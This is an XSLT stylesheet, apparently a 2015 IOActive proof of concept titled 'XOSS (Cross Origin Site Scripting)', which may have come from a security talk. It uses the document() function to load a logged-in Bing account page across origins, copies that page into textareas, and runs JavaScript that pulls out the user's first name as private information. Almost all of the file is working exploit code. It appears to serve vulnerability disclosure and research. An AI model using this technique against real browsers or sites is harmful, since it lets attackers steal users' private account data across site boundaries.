<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="cross-origin.xhtml"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns="http://www.w3.org/1999/xhtml">

 <xsl:template match="xsl:stylesheet">
 <xsl:apply-templates/>
 </xsl:template>

 <xsl:template match="/">
 <html>
 <head>
 <style>
 body {background-color: #A82A26;}
 table {background-color: #FFFFFF;
 border-style: solid;
 border-collapse: collapse;
 border-color: #CCCCCC;}
 h1 {color:#FFFFFF;
 text-align:center;}
 </style>
 <title>IOActive - XOSS (Cross Origin Site Scripting)</title>
 </head>
 <body>
 <h1>IOActive - XOSS (Cross Origin Site Scripting)</h1>
<br/>
 <table align="center">
 <xsl:apply-templates />
 </table>
 </body>
 </html>
 </xsl:template>

 <xsl:template match="text()"/>

 <xsl:template match="//node()[local-name() = name()]">
 <xsl:if test="local-name() = 'url'">
 <xsl:variable name="url" select="document(.)"/>
 <tr>
 <td>
 <b>URL:</b>
 </td>
 <td>
 <xsl:value-of select="."/>
 </td>
 </tr>
 <tr>
 <td>
 <b>&lt;xsl:value-of&gt;</b>
 </td>
 <td>
 <textarea id="valueOf" rows="10" cols="100">
 <xsl:value-of select="$url"/>
 </textarea>
 </td>
 </tr>
 <tr>
 <td>
 <b>&lt;xsl:copy-of&gt;</b>
 </td>
 <td>
 <textarea id="copyOf" rows="10" cols="100">
 <xsl:text disable-output-escaping="yes">
 &lt;![CDATA[
 </xsl:text>
 <xsl:copy-of select="$url"/>
 <xsl:text disable-output-escaping="yes">
 ]]&gt;
 </xsl:text>
 </textarea>
 </td>
 </tr>
 <tr>
 <td>
 <b>Accessing private
 information from:</b>
 </td>
 <td>
 <input type="text" id="internal"/>
 <script type="text/javascript">
 var copyOf = document.getElementById("copyOf").value;
 var firstname = copyOf.substring(copyOf.indexOf('"id_n">')+7);
 var internal = document.getElementById("internal");
 internal.value = firstname.substring(0,8);
 </script>
</td>
 </tr>
2015 IOActive, Inc. All Rights Reserved. [20]
</xsl:if>
 <xsl:apply-templates/>
</xsl:template>

 <read>
 <url>http://www.bing.com/account/general</url>
 </read>

 </xsl:stylesheet>
